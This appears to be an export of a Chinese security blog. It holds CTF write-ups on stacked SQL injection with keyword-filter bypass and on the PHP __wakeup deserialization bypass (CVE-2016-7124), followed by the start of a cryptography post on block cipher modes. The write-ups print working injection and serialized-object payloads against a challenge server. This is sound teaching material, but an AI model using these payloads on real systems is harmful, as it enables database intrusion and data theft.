<li>在url中输入<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:53805&#x2F;?inject&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;2</span><br></pre></td></tr></table></figure>
返回错误，该题为字符型注入<br><img src="https://img-blog.csdnimg.cn/20200806205808514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></li>
</ul>
<h1 id="获取列数"><a href="#获取列数" class="headerlink" title="获取列数"></a>获取列数</h1><p>输入<code>1&#39; order by 1#</code>，即表示 所select的字段按第一个字段排序<br>正常<br><img src="https://img-blog.csdnimg.cn/20200806210214723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br> 输入<code>1&#39; order by 2#</code>，正常</p>
<p><img src="https://img-blog.csdnimg.cn/20200806210419435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>输入<code>1&#39; order by 3#</code>，报错<br><img src="https://img-blog.csdnimg.cn/20200806210530333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>得出这张表只有两个字段，数据为两列</p>
<h1 id="尝试联合查询"><a href="#尝试联合查询" class="headerlink" title="尝试联合查询"></a>尝试联合查询</h1><p><strong>union</strong>运算符可以将两个或两个以上的<strong>select</strong>语句的查询结果集合合并成一个结果集显示，即执行联合查询。需要注意的使用<strong>union</strong>查询的时候需要和主查询语句的列数相同，刚才我们查询得出列数为2<br>输入<code>1&#39; union select database(),user()#</code></p>
<ul>
<li>database()会返回当前网站所使用的数据库名字</li>
<li>user()会返回执行当前查询的用户名</li>
</ul>
<p>结果如下<br><img src="https://img-blog.csdnimg.cn/20200806211444315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>发现这里过滤了一些语句，无法再进行查询了</p>
<h1 id="堆叠注入绕过过滤"><a href="#堆叠注入绕过过滤" class="headerlink" title="堆叠注入绕过过滤"></a>堆叠注入绕过过滤</h1><p>堆叠注入：堆叠查询可以执行多条SQL语句，语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。<br>我们尝试查询所有的表名<br>输入<code>1&#39;;show tables#</code><br><img src="https://img-blog.csdnimg.cn/20200806212019938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>可以发现这里有两张表，分别再查询两张表中的列<br>通过<code>desc table_name</code>语句可以查询一张表中的所有字段<br>输入<code>1&#39;;desc `1919810931114514`#</code>,注意这里为反引号<br><img src="https://img-blog.csdnimg.cn/20200806212737945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>输入<code>1&#39;;desc `words`#</code><br><img src="https://img-blog.csdnimg.cn/20200806212858429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>很显然，flag在第一张表中</p>
<h1 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h1><p>这里采用的是预编译的方式<br>介绍一下预编译的语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stmt</span><br><span class="line"></span><br><span class="line">EXECUTE stmt_name</span><br><span class="line"> [USING @var_name [, @var_name] ...] -</span><br><span class="line"></span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name</span><br><span class="line"></span><br><span class="line">set用于设置变量名和值</span><br><span class="line">prepare用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>
<p>举个例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">PREPARE</span> stmt <span class="keyword">FROM</span> <span class="string">&#x27;SELECT ?+?&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@a</span><span class="operator">=</span><span class="number">1</span>, <span class="variable">@b</span><span class="operator">=</span><span class="number">10</span> ;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">EXECUTE</span> stmt <span class="keyword">USING</span> <span class="variable">@a</span>, <span class="variable">@b</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> ?<span class="operator">+</span>? <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们已经了解了预编译的用法，接下来再使用堆叠注入<br>这里采用了CONCAT来绕过select的过滤<br>payload为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;#</span></span><br></pre></td></tr></table></figure>
<p>发现这里还过滤了<strong>set</strong>以及<strong>prepare</strong><br><img src="https://img-blog.csdnimg.cn/2020080621461259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br>需要注意的一点是这里使用了strstr对set和prepare关键字进行了检查，但是strstr检查不对大小写进行检查，所以这里可以通过大小写绕过，set和prepare关键字只要有一个是大写就可以绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>Sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;#</span></span><br></pre></td></tr></table></figure>
<p>得到flag如下<br><img src="https://img-blog.csdnimg.cn/20200806214858865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF-unserialize3</title>
    <url>/2020/08/14/XCTF-unserialize3/</url>
    <content><![CDATA[<h1 id="看到题目知道考察的是序列化与反序列化的知识"><a href="#看到题目知道考察的是序列化与反序列化的知识" class="headerlink" title="看到题目知道考察的是序列化与反序列化的知识"></a>看到题目知道考察的是序列化与反序列化的知识</h1><p>序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；</p>
<p>反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p>
<h1 id="下面是一个示例"><a href="#下面是一个示例" class="headerlink" title="下面是一个示例"></a>下面是一个示例</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xctf&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该处代码序列化后应该为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;flag&#123;xctf&#125;&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>此处做一个解释</p>
<figure class="highlight plain"><figcaption><span>4个字符:test</span></figcaption><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;:2&#96;&#96;&#96;对象属性个数为2</span><br><span class="line">&#96;&#96;&#96;&#123;&#125;&#96;&#96;&#96;中为属性字符数：属性值</span><br><span class="line"># 然后我们需要了解魔法方法__wakeup()</span><br><span class="line">PHP中以两个下划线开头的方法，__construct(), __destruct (), __call(), __callStatic(),__get(), __set(), __isset(), __unset (), __sleep(), __wakeup(), __toString(), __set_state,() __clone() __autoload()等，被称为&quot;魔术方法&quot;（Magic methods）。这些方法在一定条件下有特殊的功能</span><br><span class="line"></span><br><span class="line">这里只谈一下 **__wakeup**</span><br><span class="line"></span><br><span class="line"> **__wakeup()** 是用在反序列化操作中。**unserialize()** 会检查存在一个 **__wakeup()** 方法。如果存在，则先会调用 **__wakeup()** 方法</span><br><span class="line"></span><br><span class="line">**__wakeup()** 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作</span><br><span class="line"></span><br><span class="line"># 看题</span><br><span class="line">打开链接后显示如下</span><br><span class="line">![](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200804203738516.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line">代码定义了一个**xctf**的类，其中存在 **__wakeup**方法</span><br><span class="line"></span><br><span class="line">**__wakeup** 会直接退出，并输出 &#39;bad request&#39;</span><br><span class="line"></span><br><span class="line">根据末尾的一个 **?code&#x3D;** 推知应该是需要构造url</span><br><span class="line"></span><br><span class="line"># 传入序列化后的字符串</span><br><span class="line"></span><br><span class="line">**__wakeup()** 方法会在使用函数unserialize()时自动调用</span><br><span class="line"></span><br><span class="line">手动传入一个序列化的字符串试试</span><br><span class="line"></span><br><span class="line">序列化如下</span><br></pre></td></tr></table></figure>
<p>O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造payload</span><br></pre></td></tr></table></figure>
<p>payload=?code=O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构造后跳转如下</span><br><span class="line">![](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200804204555554.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)</span><br><span class="line"># 利用__wakeup()漏洞</span><br><span class="line">对应的CVE编号: **CVE-2016-7124**</span><br><span class="line"></span><br><span class="line">- 存在漏洞的PHP版本: **PHP5.6.25** 之前版本和 **7.0.10** 之前的**7.x**版本</span><br><span class="line">- 漏洞概述: **__wakeup()** 魔法函数被绕过,导致执行了一些非预期效果的漏洞</span><br><span class="line">- 漏洞原理: 当对象的 **属性(变量)数** 大于实际的个数时, **__wakeup()** 魔法函数被绕过</span><br><span class="line"></span><br><span class="line">于是，payload构造如下，将属性数由1改为2</span><br></pre></td></tr></table></figure>
<p>payload=?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
<p>```</p>
<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20200804205059733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYxMzc2MA==,size_16,color_FFFFFF,t_70"><br><strong>注意</strong><br>反序列化知识点补充:  私有属性和被保护的属性，需要加上 \00*\00 。再base64编码。</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>分组密码的工作模式</title>
    <url>/2021/04/10/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h1><h2 id="工作模式介绍"><a href="#工作模式介绍" class="headerlink" title="工作模式介绍"></a>工作模式介绍</h2><p>分组密码算法是提供数据安全的基本构件。它以固定的分组长度作为基本的处理单元，但要加密的消息长度较之可能要长得多。为了将分组密码算法应用于实际，人们定义了很多工作模式，如美国国家标准技术研究所（NIST）到2012年为止定义了12个工作模式，下面介绍最常用的五个。这里讨论的五种操作模式分别是：电子本模式（ECB），密码分组链接模式（CBC），密码反馈模式（CFB），输出反馈模式（OFB），以及计数器模式（CTR）。</p>
<p>本处设分组密码的分组长度为b位，分组的个数为n。</p>
<h3 id="电子本模式（Electronic-Codebook-Mode）"><a href="#电子本模式（Electronic-Codebook-Mode）" class="headerlink" title="电子本模式（Electronic Codebook Mode）"></a>电子本模式（Electronic Codebook Mode）</h3><p>电子密码本ECB模式是最简单的模式。它直接利用加密算法分别对每个明文分组使用相同密钥进行加密。设明文分组序列为<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="18.776ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 8298.8 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(1328.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2384.6, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mn" transform="translate(970, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="msub" transform="translate(3758.1, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mn" transform="translate(970, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5353.9, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(5854.1, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(6354.3, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="msub" transform="translate(6854.6, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container><br>响应的密文分组序列为<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="16.386ex" height="1.952ex" role="img" focusable="false" viewBox="0 -705 7242.8 862.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1037.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2093.6, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(715, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="msub" transform="translate(3212.1, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(715, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4552.9, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(5053.1, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(5553.3, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="msub" transform="translate(6053.6, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container><br>则<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="28.001ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 12376.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 